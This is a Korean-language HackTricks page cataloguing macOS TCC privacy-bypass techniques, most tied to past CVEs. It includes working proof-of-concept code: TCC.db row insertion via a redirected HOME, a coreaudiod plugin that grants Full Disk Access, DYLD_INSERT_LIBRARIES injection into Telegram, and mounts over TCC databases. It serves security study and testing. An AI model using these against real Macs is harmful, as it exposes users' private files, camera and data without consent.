# macOS TCC 우회

{{#include ../../../../../banners/hacktricks-training.md}}

## 기능별

### Write Bypass

이는 우회가 아니라 TCC가 작동하는 방식일 뿐입니다. **쓰기 작업은 보호하지 않습니다**. Terminal에 사용자의 Desktop을 **읽을** 권한이 없어도 해당 위치에 **쓸 수 있습니다**:
```shell-session
username@hostname ~ % ls Desktop
ls: Desktop: Operation not permitted
username@hostname ~ % echo asd > Desktop/lalala
username@hostname ~ % ls Desktop
ls: Desktop: Operation not permitted
username@hostname ~ % cat Desktop/lalala
asd
```
**확장 속성 `com.apple.macl`**은 새로운 **file**에 추가되어 **creators app**이 이를 읽을 수 있는 access를 제공합니다.

### TCC ClickJacking

사용자가 이를 인지하지 못한 채 **accept**하도록 **TCC prompt 위에 창을 올려놓는 것**이 가능합니다. PoC는 [**TCC-ClickJacking**](https://github.com/breakpointHQ/TCC-ClickJacking)**에서 확인할 수 있습니다.**

<figure><img src="broken-reference" alt=""><figcaption><p><a href="https://github.com/breakpointHQ/TCC-ClickJacking/raw/main/resources/clickjacking.jpg">https://github.com/breakpointHQ/TCC-ClickJacking/raw/main/resources/clickjacking.jpg</a></p></figcaption></figure>

### TCC Request by arbitrary name

Attacker는 **`Info.plist`에서 어떤 이름이든** (예: Finder, Google Chrome...) **가진 apps를 create**하고, 일부 TCC protected location에 대한 access를 요청하도록 만들 수 있습니다. 사용자는 legit application이 이 access를 요청하고 있다고 생각할 것입니다.\
또한, **Dock에서 legit app을 제거하고 fake one을 그 자리에 배치**할 수 있습니다. 따라서 사용자가 fake one(동일한 icon을 사용할 수 있음)을 클릭하면 legit one을 호출하고, TCC permissions를 요청한 뒤 malware를 execute하여 사용자가 legit app이 access를 요청했다고 믿게 만들 수 있습니다.

<figure><img src="https://lh7-us.googleusercontent.com/Sh-Z9qekS_fgIqnhPVSvBRmGpCXCpyuVuTw0x5DLAIxc2MZsSlzBOP7QFeGo_fjMeCJJBNh82f7RnewW1aWo8r--JEx9Pp29S17zdDmiyGgps1hH9AGR8v240m5jJM8k0hovp7lm8ZOrbzv-RC8NwzbB8w=s2048" alt="" width="375"><figcaption></figcaption></figure>

More info and PoC in:


{{#ref}}
../../../macos-privilege-escalation.md
{{#endref}}

### SSH Bypass

기본적으로 **SSH를 통한 access에는 "Full Disk Access"가 있었**습니다. 이를 disable하려면 해당 항목이 목록에 표시되지만 disabled 상태여야 합니다(목록에서 제거해도 해당 privileges는 제거되지 않음):

![TCC Request by arbitrary name - SSH Bypass: 기본적으로 SSH를 통한 access에는 "Full Disk Access"가 있었습니다. 이를 disable하려면 해당 항목이 목록에 표시되지만 disabled 상태여야 합니다(목록에서 제거해도...](<../../../../../images/image (1077).png>)

여기에서 일부 **malwares가 이 protection을 bypass할 수 있었던 방법**의 examples를 확인할 수 있습니다:

- [https://www.jamf.com/blog/zero-day-tcc-bypass-discovered-in-xcsset-malware/](https://www.jamf.com/blog/zero-day-tcc-bypass-discovered-in-xcsset-malware/)

> [!CAUTION]
> 이제 SSH를 enable하려면 **Full Disk Access**가 필요합니다.

### Handle extensions - CVE-2022-26767

**`com.apple.macl`** attribute는 **특정 application에 해당 파일을 읽을 permissions를 제공하기 위해** files에 부여됩니다. 이 attribute는 파일을 app 위로 **drag\&drop**하거나, 사용자가 파일을 **double-click하여 default application으로 열 때** 설정됩니다.

따라서 user는 **모든 extensions를 handle하도록 malicious app을 register**하고 Launch Services를 호출하여 모든 파일을 **open**하도록 만들 수 있습니다(이렇게 하면 malicious file에 해당 파일을 읽을 access가 부여됨).

### iCloud

**`com.apple.private.icloud-account-access`** entitlement를 사용하면 **iCloud tokens를 제공하는** **`com.apple.iCloudHelper`** XPC service와 communicate할 수 있습니다.

**iMovie**와 **Garageband**에는 이 entitlement 및 이를 허용하는 다른 entitlement가 있었습니다.

해당 entitlement를 통해 **icloud tokens를 획득하는** exploit에 대한 자세한 **information**은 다음 talk를 확인하세요: [**#OBTS v5.0: "What Happens on your Mac, Stays on Apple's iCloud?!" - Wojciech Regula**](https://www.youtube.com/watch?v=_6e2LhmxVc0)

### kTCCServiceAppleEvents / Automation

**`kTCCServiceAppleEvents`** permission이 있는 app은 **다른 Apps를 control**할 수 있습니다. 즉, **다른 Apps에 부여된 permissions를 abuse**할 수 있습니다.

Apple Scripts에 대한 자세한 info는 다음을 확인하세요:


{{#ref}}
macos-apple-scripts.md
{{#endref}}

예를 들어 App에 **`iTerm`에 대한 Automation permission**이 있다면, 다음 예시처럼 **`Terminal`**이 iTerm에 access할 수 있습니다:

<figure><img src="../../../../../images/image (981).png" alt=""><figcaption></figcaption></figure>

#### Over iTerm

FDA가 없는 Terminal은 iTerm을 호출할 수 있으며, iTerm은 FDA를 가지고 있으므로 이를 사용해 actions를 수행할 수 있습니다:
```applescript:iterm.script
tell application "iTerm"
activate
tell current window
create tab with default profile
end tell
tell current session of current window
write text "cp ~/Desktop/private.txt /tmp"
end tell
end tell
```

```bash
osascript iterm.script
```
#### Finder를 통한 접근

또는 App이 Finder를 통한 접근 권한을 가지고 있다면, 다음과 같은 script를 사용할 수 있습니다:
```applescript
set a_user to do shell script "logname"
tell application "Finder"
set desc to path to home folder
set copyFile to duplicate (item "private.txt" of folder "Desktop" of folder a_user of item "Users" of disk of home) to folder desc with replacing
set t to paragraphs of (do shell script "cat " & POSIX path of (copyFile as alias)) as text
end tell
do shell script "rm " & POSIX path of (copyFile as alias)
```
## 앱 동작별

### CVE-2020–9934 - TCC <a href="#c19b" id="c19b"></a>

사용자 영역의 **tccd daemon**은 **`HOME`** **env** 변수를 사용하여 다음 위치에서 TCC 사용자 데이터베이스에 접근합니다: **`$HOME/Library/Application Support/com.apple.TCC/TCC.db`**

[이 Stack Exchange 게시물](https://stackoverflow.com/questions/135688/setting-environment-variables-on-os-x/3756686#3756686)에 따르면, 그리고 TCC daemon이 현재 사용자의 domain 내에서 `launchd`를 통해 실행되므로, 해당 daemon에 전달되는 **모든 environment variables를 제어**할 수 있습니다.\
따라서 **attacker는 `launchctl`에서 `$HOME` environment variable**을 자신이 **제어하는** **directory**를 가리키도록 설정하고, **TCC** daemon을 **restart**한 다음, **TCC database를 직접 수정**하여 최종 사용자에게 아무런 prompt도 표시하지 않고 자신에게 사용 가능한 **모든 TCC entitlement**를 부여할 수 있습니다.\
PoC:
```bash
# reset database just in case (no cheating!)
$> tccutil reset All
# mimic TCC's directory structure from ~/Library
$> mkdir -p "/tmp/tccbypass/Library/Application Support/com.apple.TCC"
# cd into the new directory
$> cd "/tmp/tccbypass/Library/Application Support/com.apple.TCC/"
# set launchd $HOME to this temporary directory
$> launchctl setenv HOME /tmp/tccbypass
# restart the TCC daemon
$> launchctl stop com.apple.tccd && launchctl start com.apple.tccd
# print out contents of TCC database and then give Terminal access to Documents
$> sqlite3 TCC.db .dump
$> sqlite3 TCC.db "INSERT INTO access
VALUES('kTCCServiceSystemPolicyDocumentsFolder',
'com.apple.Terminal', 0, 1, 1,
X'fade0c000000003000000001000000060000000200000012636f6d2e6170706c652e5465726d696e616c000000000003',
NULL,
NULL,
'UNUSED',
NULL,
NULL,
1333333333333337);"
# list Documents directory without prompting the end user
$> ls ~/Documents
```
### CVE-2021-30761 - Notes

Notes had access to TCC protected locations but when a note is created this is **created in a non-protected location**. 따라서 Notes에 보호된 파일을 noe에 복사하도록 요청할 수 있었고(즉, 보호되지 않은 위치에 복사), 이후 해당 파일에 access할 수 있었습니다:

<figure><img src="../../../../../images/image (476).png" alt=""><figcaption></figcaption></figure>

### CVE-2021-30782 - Translocation

The binary `/usr/libexec/lsd` with the library `libsecurity_translocate` had the entitlement `com.apple.private.nullfs_allow` which allowed it to crate **nullfs** mount and had the entitlement `com.apple.private.tcc.allow` with **`kTCCServiceSystemPolicyAllFiles`** to access every file.

"Library"에 quarantine attribute를 추가하고 **`com.apple.security.translocation`** XPC service를 호출하면, Library가 **`$TMPDIR/AppTranslocation/d/d/Library`**에 매핑되며 Library 내부의 모든 문서에 **access**할 수 있었습니다.

### CVE-2024-44131 - FileProvider symlink race

파일 작업을 **privileged helper**(여기서는 **`fileproviderd`** / **`Files.app`**)에 넘기는 앱은 사용자를 **대신하여** 항목을 copy하거나 move하므로, copy는 caller가 아닌 helper의 privileges로 실행됩니다.

Jamf Threat Labs는 작업 전에 수행되는 symlink validation이 **race**될 수 있음을 보여주었습니다. **마지막** path component에 symlink를 심는 대신(검사되는 부분), attacker는 copy가 이미 시작된 **후에** path의 **intermediate** directory를 교체합니다. 그러면 privileged helper가 attacker가 제어하는 link를 따라가며 **prompt를 표시하지 않고도** TCC-protected locations를 읽거나 쓸 수 있습니다.

path에 random UUID로 보호되지 않은 directory(예: `~/Library/Mobile Documents/com~apple~CloudDocs`)가 가장 쉬운 target입니다. attacker가 race를 수행할 전체 path를 예측할 수 있기 때문입니다.

> [!TIP]
> 다음은 찾아야 할 generic pattern입니다: **path를 두 번 이상 resolve하는 모든 privileged process**(check-then-use 또는 `rename()`/`copyfile()`이 source와 destination을 별도로 resolve하는 경우)는 path 중간의 directory를 교체하여 race할 수 있습니다. `O_NOFOLLOW_ANY`, 이미 열린 directory FD에서의 `openat()`, 또는 `realpath()` + 재검증만이 실제로 이 window를 닫습니다.

More info in [**the Jamf Threat Labs writeup**](https://www.jamf.com/blog/tcc-bypass-steals-data-from-icloud/).

### SQLITE_SQLLOG_DIR

`libsqlite3`은 `SQLITE_ENABLE_SQLLOG`로 build할 수 있으며, environment variables로 구동되는 logging hook을 추가합니다([upstream `test_sqllog.c`](https://github.com/sqlite/sqlite/blob/master/src/test_sqllog.c)):

- **`SQLITE_SQLLOG_DIR=path`** – **열리는 모든 database에 대해**, **database file의 copy**와 SQL statements log가 `path`에 기록됩니다(directory는 이미 존재해야 합니다).
- **`SQLITE_SQLLOG_REUSE_FILES=0`** – DB를 open/attach할 때마다 기존 파일을 재사용하는 대신 **매번 새로운 copy를 생성**합니다.
- **`SQLITE_SQLLOG_CONDITIONAL`** – main DB 옆에 `<database>-sqllog` file이 존재하는 connection만 log합니다.

FDA를 보유하고 SQLite databases를 여는 process에 이 variable을 inject할 수 있다면, 해당 process는 보호된 databases를 사용자가 제어하는 directory로 **기꺼이 copy**합니다. destination filename이 attacker-controlled data에서 파생되므로, destination에 심은 **symlink**를 통해 동일한 primitive를 target process의 privileges로 **arbitrary file write**로 전환할 수 있습니다.

### **SQLITE_AUTO_TRACE**

environment variable **`SQLITE_AUTO_TRACE`**가 설정되면, library **`libsqlite3.dylib`**가 모든 SQL queries를 **logging**하기 시작합니다. 많은 application이 이 library를 사용하므로, 해당 application의 모든 SQLite queries를 log할 수 있었습니다.

여러 Apple application이 이 library를 사용해 TCC protected information에 access했습니다.
```bash
# Set this env variable everywhere
launchctl setenv SQLITE_AUTO_TRACE 1
```
### env-var driven file writes 탐색

앞의 두 항목은 동일한 generic technique의 사례이며, 더 많은 사례를 찾아볼 가치가 있습니다. **TCC-privileged apps에 로드된 frameworks는 프로세스가 caller-controlled path에 파일을 생성하도록 하는 debug/logging environment variables를 노출하는 경우가 많습니다**.

찾는 workflow:

1. FDA 또는 다른 유용한 TCC permission이 있는 target (`Music`, `TV`, `Terminal`, MDM agents...)을 선택하고, 해당 target이 link하는 frameworks를 나열합니다 (`otool -L`, `vmmap`).
2. 해당 frameworks에서 `getenv` strings를 grep합니다: `strings -a /System/Library/Frameworks/<X>.framework/<X> | grep -iE '^[A-Z0-9_]{6,}$'`.
3. `launchctl setenv NAME /path/you/control`을 사용해 candidate variables를 설정하고, app을 실행한 뒤 `fs_usage -w -f filesys <pid>` 또는 `sudo fs_usage | grep <path>`로 filesystem에서 수행하는 작업을 확인합니다.
4. 프로세스가 여러분의 directory에 있는 파일을 **생성하거나 이름을 변경**한다면 write primitive를 확보한 것입니다. destination을 symlink로 지정하거나, 위의 CVE-2024-44131처럼 intermediate directory에 race를 발생시켜 `~/Library/Application Support/com.apple.TCC/TCC.db`로 redirect합니다.

> [!TIP]
> 이 방법에는 두 가지 제한이 있습니다. 첫째, app이 [`com.apple.security.cs.allow-dyld-environment-variables`](https://developer.apple.com/documentation/bundleresources/entitlements/com.apple.security.cs.allow-dyld-environment-variables) entitlement("dynamic linker environment variables의 영향을 받을 수 있는지 나타내는 Boolean 값으로, app의 process에 code를 inject하는 데 사용할 수 있음")을 제공하지 않는 한 **`DYLD_*` variables는 hardened-runtime binaries에서 무시됩니다** — [Notarization: the hardened runtime](https://eclecticlight.co/2021/01/07/notarization-the-hardened-runtime/)도 참고하십시오. 둘째, Apple은 individual framework debug variables가 보고되면 이를 제거하므로, 한 macOS release에서 작동한 variable이 다음 release에서는 사라지는 경우가 많습니다. 하나를 설정한 후 app이 아무런 메시지 없이 실행을 거부한다면 해당 variable이 이미 filtered된 것으로 간주하십시오.

linker variables를 사용하는 동일한 trick은 [macOS Dyld Hijacking & DYLD_INSERT_LIBRARIES](../../../macos-proces-abuse/macos-library-injection/macos-dyld-hijacking-and-dyld_insert_libraries.md)를 참고하십시오.

### Apple Remote Desktop

root로 이 service를 enable하면 **ARD agent가 full disk access를 갖게 되며**, 이를 user가 악용하여 새로운 **TCC user database**를 복사하도록 만들 수 있습니다.

## **NFSHomeDirectory** 사용

TCC는 **$HOME/Library/Application Support/com.apple.TCC/TCC.db**에 있는 user의 HOME folder 내 database를 사용하여 해당 user에게 특정된 resource에 대한 access를 제어합니다.\
따라서 user가 다른 folder를 가리키는 `$HOME` env variable을 사용하여 TCC를 restart할 수 있다면, **/Library/Application Support/com.apple.TCC/TCC.db**에 새로운 TCC database를 생성하고 TCC를 속여 모든 app에 임의의 TCC permission을 부여할 수 있습니다.

> [!TIP]
> Apple은 user profile에 저장된 **`NFSHomeDirectory`** attribute의 설정을 `$HOME`의 **값**으로 사용합니다. 따라서 이 값을 수정할 permission(**`kTCCServiceSystemPolicySysAdminFiles`**)이 있는 application을 compromise하면 TCC bypass와 함께 이 option을 **weaponize**할 수 있습니다.

### [CVE-2020–9934 - TCC](#c19b) <a href="#c19b" id="c19b"></a>

### [CVE-2020-27937 - Directory Utility](#cve-2020-27937-directory-utility-1)

### CVE-2021-30970 - Powerdir

**첫 번째 POC**는 [**dsexport**](https://www.unix.com/man-page/osx/1/dsexport/)와 [**dsimport**](https://www.unix.com/man-page/osx/1/dsimport/)를 사용하여 user의 **HOME** folder를 수정합니다.

1. target app의 _csreq_ blob을 가져옵니다.
2. 필요한 access와 _csreq_ blob을 포함한 fake _TCC.db_ file을 plant합니다.
3. [**dsexport**](https://www.unix.com/man-page/osx/1/dsexport/)를 사용하여 user의 Directory Services entry를 export합니다.
4. user의 home directory를 변경하도록 Directory Services entry를 수정합니다.
5. [**dsimport**](https://www.unix.com/man-page/osx/1/dsimport/)를 사용하여 수정된 Directory Services entry를 import합니다.
6. user의 _tccd_를 stop하고 process를 reboot합니다.

두 번째 POC는 `kTCCServiceSystemPolicySysAdminFiles` 값을 가진 `com.apple.private.tcc.allow`을 포함하는 **`/usr/libexec/configd`**를 사용했습니다.\
`configd`를 **`-t`** option과 함께 실행할 수 있었으며, attacker는 **로드할 custom Bundle**을 지정할 수 있었습니다. 따라서 이 exploit은 user의 home directory를 변경하는 **`dsexport`** 및 **`dsimport`** method를 **`configd` code injection**으로 **대체**합니다.

자세한 내용은 [**original report**](https://www.microsoft.com/en-us/security/blog/2022/01/10/new-macos-vulnerability-powerdir-could-lead-to-unauthorized-user-data-access/)를 참고하십시오.

## process injection 사용

process 내부에 code를 inject하고 해당 process의 TCC privileges를 악용하는 여러 technique이 있습니다:


{{#ref}}
../../../macos-proces-abuse/
{{#endref}}

또한 TCC를 bypass하는 데 사용되는 가장 일반적인 process injection은 **plugins (load library)**를 통한 방식입니다.\
Plugins는 일반적으로 libraries 또는 plist 형태의 추가 code이며, **main application에 의해 로드되어** 해당 application의 context에서 실행됩니다. 따라서 main application이 granted permissions 또는 entitlements를 통해 TCC restricted files에 access할 수 있다면 **custom code도 동일한 access를 갖게 됩니다**.

### CVE-2020-27937 - Directory Utility

`/System/Library/CoreServices/Applications/Directory Utility.app` application은 **`kTCCServiceSystemPolicySysAdminFiles`** entitlement를 가지고 있었고, **`.daplug`** extension의 plugins를 로드했으며 **hardened** runtime이 없었습니다.

이 CVE를 weaponize하려면, TCC를 bypass하기 위해 **NFSHomeDirectory**를 **변경**(앞의 entitlement 악용)하여 user의 TCC database를 **take over**할 수 있어야 합니다.

자세한 내용은 [**original report**](https://wojciechregula.blog/post/change-home-directory-and-bypass-tcc-aka-cve-2020-27937/)를 참고하십시오.

### CVE-2020-29621 - Coreaudiod

**`/usr/sbin/coreaudiod`** binary에는 `com.apple.security.cs.disable-library-validation` 및 `com.apple.private.tcc.manager` entitlements가 있었습니다. 첫 번째 entitlement는 **code injection을 허용**하고, 두 번째 entitlement는 **TCC를 manage할 access**를 제공합니다.

이 binary는 `/Library/Audio/Plug-Ins/HAL` folder에서 **third party plug-ins**를 로드할 수 있었습니다. 따라서 plugin을 **로드하고 TCC permissions를 악용**하는 것이 가능했으며, 다음 POC를 사용할 수 있습니다:
```objectivec
#import <Foundation/Foundation.h>
#import <Security/Security.h>

extern void TCCAccessSetForBundleIdAndCodeRequirement(CFStringRef TCCAccessCheckType, CFStringRef bundleID, CFDataRef requirement, CFBooleanRef giveAccess);

void add_tcc_entry() {
CFStringRef TCCAccessCheckType = CFSTR("kTCCServiceSystemPolicyAllFiles");

CFStringRef bundleID = CFSTR("com.apple.Terminal");
CFStringRef pureReq = CFSTR("identifier \"com.apple.Terminal\" and anchor apple");
SecRequirementRef requirement = NULL;
SecRequirementCreateWithString(pureReq, kSecCSDefaultFlags, &requirement);
CFDataRef requirementData = NULL;
SecRequirementCopyData(requirement, kSecCSDefaultFlags, &requirementData);

TCCAccessSetForBundleIdAndCodeRequirement(TCCAccessCheckType, bundleID, requirementData, kCFBooleanTrue);
}

__attribute__((constructor)) static void constructor(int argc, const char **argv) {

add_tcc_entry();

NSLog(@"[+] Exploitation finished...");
exit(0);
```
자세한 내용은 [**original report**](https://wojciechregula.blog/post/play-the-music-and-bypass-tcc-aka-cve-2020-29621/)를 확인하세요.

### Device Abstraction Layer (DAL) Plug-Ins

Core Media I/O를 통해 camera stream을 여는 system applications (**`kTCCServiceCamera`**가 적용된 apps)는 `/Library/CoreMediaIO/Plug-Ins/DAL`(SIP 제한이 적용되지 않음)에 위치한 **이 plugins를 프로세스에 로드**합니다.

해당 위치에 일반적인 **constructor**가 포함된 library를 저장하는 것만으로도 **inject code**가 가능합니다.

여러 Apple applications가 이에 취약했습니다.

### Firefox

Firefox application에는 `com.apple.security.cs.disable-library-validation` 및 `com.apple.security.cs.allow-dyld-environment-variables` entitlements가 있었습니다:
```xml
codesign -d --entitlements :- /Applications/Firefox.app
Executable=/Applications/Firefox.app/Contents/MacOS/firefox

<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "https://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
<key>com.apple.security.cs.allow-unsigned-executable-memory</key>
<true/>
<key>com.apple.security.cs.disable-library-validation</key>
<true/>
<key>com.apple.security.cs.allow-dyld-environment-variables</key><true/>
<true/>
<key>com.apple.security.device.audio-input</key>
<true/>
<key>com.apple.security.device.camera</key>
<true/>
<key>com.apple.security.personal-information.location</key>
<true/>
<key>com.apple.security.smartcard</key>
<true/>
</dict>
</plist>
```
이 취약점을 쉽게 exploit하는 방법에 대한 자세한 내용은 [**original report를 확인하세요**](https://wojciechregula.blog/post/how-to-rob-a-firefox/).

### CVE-2020-10006

바이너리 `/system/Library/Filesystems/acfs.fs/Contents/bin/xsanctl`에는 **`com.apple.private.tcc.allow`** 및 **`com.apple.security.get-task-allow`** entitlements가 있었으며, 이를 통해 프로세스 내부에 code를 inject하고 TCC privileges를 사용할 수 있었습니다.

### CVE-2023-26818 - Telegram

Telegram에는 **`com.apple.security.cs.allow-dyld-environment-variables`** 및 **`com.apple.security.cs.disable-library-validation`** entitlements가 있었으므로, 이를 abuse하여 카메라 recording과 같이 **해당 앱의 permissions에 access**할 수 있었습니다. [**writeup에서 payload를 확인할 수 있습니다**](https://danrevah.github.io/2023/05/15/CVE-2023-26818-Bypass-TCC-with-Telegram/).

env variable을 사용하여 library를 load하기 위해 **`custom plist`**를 생성하고, 이 library를 inject한 뒤 **`launchctl`**을 사용하여 실행했다는 점에 주목하세요:
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
<key>Label</key>
<string>com.telegram.launcher</string>
<key>RunAtLoad</key>
<true/>
<key>EnvironmentVariables</key>
<dict>
<key>DYLD_INSERT_LIBRARIES</key>
<string>/tmp/telegram.dylib</string>
</dict>
<key>ProgramArguments</key>
<array>
<string>/Applications/Telegram.app/Contents/MacOS/Telegram</string>
</array>
<key>StandardOutPath</key>
<string>/tmp/telegram.log</string>
<key>StandardErrorPath</key>
<string>/tmp/telegram.log</string>
</dict>
</plist>
```

```bash
launchctl load com.telegram.launcher.plist
```
## open invocations를 통한 방법

sandboxed 상태에서도 **`open`**을 invoke하는 것이 가능합니다.

### Terminal Scripts

기술 인력이 사용하는 컴퓨터에서는 Terminal에 **Full Disk Access (FDA)** 권한을 부여하는 경우가 상당히 흔합니다. 그리고 이를 사용해 **`.terminal`** scripts를 invoke하는 것도 가능합니다.

**`.terminal`** scripts는 다음과 같이 실행할 command가 **`CommandString`** key에 포함된 plist files입니다:
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd"> <plist version="1.0">
<dict>
<key>CommandString</key>
<string>cp ~/Desktop/private.txt /tmp/;</string>
<key>ProfileCurrentVersion</key>
<real>2.0600000000000001</real>
<key>RunCommandAsShell</key>
<false/>
<key>name</key>
<string>exploit</string>
<key>type</key>
<string>Window Settings</string>
</dict>
</plist>
```
애플리케이션은 /tmp와 같은 위치에 터미널 스크립트를 작성하고 다음과 같은 명령으로 실행할 수 있습니다:
```objectivec
// Write plist in /tmp/tcc.terminal
[...]
NSTask *task = [[NSTask alloc] init];
NSString * exploit_location = @"/tmp/tcc.terminal";
task.launchPath = @"/usr/bin/open";
task.arguments = @[@"-a", @"/System/Applications/Utilities/Terminal.app",
exploit_location]; task.standardOutput = pipe;
[task launch];
```
## By mounting

### CVE-2020-9771 - mount_apfs TCC bypass and privilege escalation

**모든 사용자**(권한이 없는 사용자도 포함)는 Time Machine snapshot을 생성하고 mount하여 해당 snapshot의 **모든 파일에 액세스**할 수 있습니다.\
필요한 **유일한 권한**은 사용되는 애플리케이션(예: `Terminal`)에 **Full Disk Access**(FDA) 액세스 권한(`kTCCServiceSystemPolicyAllfiles`)이 부여되어 있어야 한다는 것이며, 이 권한은 관리자가 부여해야 합니다.
```bash
# Create snapshot
tmutil localsnapshot

# List snapshots
tmutil listlocalsnapshots /
Snapshots for disk /:
com.apple.TimeMachine.2023-05-29-001751.local

# Generate folder to mount it
cd /tmp # I didn it from this folder
mkdir /tmp/snap

# Mount it, "noowners" will mount the folder so the current user can access everything
/sbin/mount_apfs -o noowners -s com.apple.TimeMachine.2023-05-29-001751.local /System/Volumes/Data /tmp/snap

# Access it
ls /tmp/snap/Users/admin_user # This will work
```
더 자세한 설명은 [**original report에서 확인할 수 있습니다**](https://theevilbit.github.io/posts/cve_2020_9771/)**.**

### CVE-2021-1784 & CVE-2021-30808 - TCC 파일 위에 Mount

TCC DB 파일이 보호되고 있더라도, **directory 위에** 새로운 TCC.db 파일을 mount하는 것이 가능했습니다:
```bash
# CVE-2021-1784
## Mount over Library/Application\ Support/com.apple.TCC
hdiutil attach -owners off -mountpoint Library/Application\ Support/com.apple.TCC test.dmg

# CVE-2021-1784
## Mount over ~/Library
hdiutil attach -readonly -owners off -mountpoint ~/Library /tmp/tmp.dmg
```

```python
# This was the python function to create the dmg
def create_dmg():
os.system("hdiutil create /tmp/tmp.dmg -size 2m -ov -volname \"tccbypass\" -fs APFS 1>/dev/null")
os.system("mkdir /tmp/mnt")
os.system("hdiutil attach -owners off -mountpoint /tmp/mnt /tmp/tmp.dmg 1>/dev/null")
os.system("mkdir -p /tmp/mnt/Application\ Support/com.apple.TCC/")
os.system("cp /tmp/TCC.db /tmp/mnt/Application\ Support/com.apple.TCC/TCC.db")
os.system("hdiutil detach /tmp/mnt 1>/dev/null")
```
전체 **exploit**는 [**original writeup**](https://theevilbit.github.io/posts/cve-2021-30808/)에서 확인할 수 있습니다.

### CVE-2024-40855

[original writeup](https://www.kandji.io/blog/macos-audit-story-part2)에서 설명한 것처럼, 이 CVE는 `diskarbitrationd`를 악용했습니다.

public `DiskArbitration` framework의 `DADiskMountWithArgumentsCommon` function이 security checks를 수행했습니다. 그러나 `diskarbitrationd`를 직접 호출하면 이를 bypass할 수 있으므로, 경로에 `../` elements와 symlinks를 사용할 수 있었습니다.

이를 통해 attacker는 어느 위치에든 arbitrary mounts를 수행할 수 있었습니다. 여기에는 `diskarbitrationd`의 `com.apple.private.security.storage-exempt.heritable` entitlement로 인해 TCC database를 덮어 마운트하는 것도 포함됩니다.

### asr

**`/usr/sbin/asr`** tool을 사용하면 전체 disk를 copy하여 다른 위치에 mount하고 TCC protections를 bypass할 수 있었습니다.

### Location Services

**location services에 access할 수 있는** clients를 나타내는 세 번째 TCC database가 **`/var/db/locationd/clients.plist`**에 있습니다.\
**`/var/db/locationd/` folder는 DMG mounting으로부터 보호되지 않았기 때문에**, 자체 plist를 mount할 수 있었습니다.

## startup apps를 통한 방법


{{#ref}}
../../../../macos-auto-start-locations.md
{{#endref}}

## grep을 통한 방법

여러 경우에 files는 emails, phone numbers, messages...와 같은 sensitive information을 non-protected locations에 저장합니다(Apple에서는 이를 vulnerability로 간주합니다).

<figure><img src="../../../../../images/image (474).png" alt=""><figcaption></figcaption></figure>

## Synthetic Clicks

이 방법은 더 이상 작동하지 않지만, [**과거에는 작동했습니다**](https://twitter.com/noarfromspace/status/639125916233416704/photo/1)**:**

<figure><img src="../../../../../images/image (29).png" alt=""><figcaption></figcaption></figure>

[**CoreGraphics events**](https://objectivebythesea.org/v2/talks/OBTS_v2_Wardle.pdf)를 사용하는 또 다른 방법:

<figure><img src="../../../../../images/image (30).png" alt="" width="563"><figcaption></figcaption></figure>

## Reference

- [**https://medium.com/@mattshockl/cve-2020-9934-bypassing-the-os-x-transparency-consent-and-control-tcc-framework-for-4e14806f1de8**](https://medium.com/@mattshockl/cve-2020-9934-bypassing-the-os-x-transparency-consent-and-control-tcc-framework-for-4e14806f1de8)
- [**https://www.sentinelone.com/labs/bypassing-macos-tcc-user-privacy-protections-by-accident-and-design/**](https://www.sentinelone.com/labs/bypassing-macos-tcc-user-privacy-protections-by-accident-and-design/)
- [**20+ Ways to Bypass Your macOS Privacy Mechanisms**](https://www.youtube.com/watch?v=W9GxnP8c8FU)
- [**Knockout Win Against TCC - 20+ NEW Ways to Bypass Your MacOS Privacy Mechanisms**](https://www.youtube.com/watch?v=a9hsxPdRxsY)
- [**Jamf Threat Labs - CVE-2024-44131: TCC bypass steals data from iCloud**](https://www.jamf.com/blog/tcc-bypass-steals-data-from-icloud/)
- [**SQLite - `test_sqllog.c` (SQLITE_ENABLE_SQLLOG env variables)**](https://github.com/sqlite/sqlite/blob/master/src/test_sqllog.c)
- [**Apple - Allow DYLD environment variables entitlement**](https://developer.apple.com/documentation/bundleresources/entitlements/com.apple.security.cs.allow-dyld-environment-variables)
- [**The Eclectic Light Company - Notarization: the hardened runtime**](https://eclecticlight.co/2021/01/07/notarization-the-hardened-runtime/)

{{#include ../../../../../banners/hacktricks-training.md}}
